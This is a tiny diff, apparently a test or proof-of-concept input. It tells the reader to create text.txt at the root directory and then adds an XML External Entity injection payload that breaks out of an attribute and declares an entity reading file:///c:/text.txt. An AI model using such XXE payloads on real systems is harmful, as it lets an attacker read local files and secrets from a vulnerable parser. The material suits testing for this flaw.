@@ -1,0 +1,3 @@
+create a file on root direcory with a name like text.txt
+
+bla"> <!ENTITY xxe SYSTEM "file:///c:/text.txt">]> <xmlfile> <data> &xxe; <![CDATA[
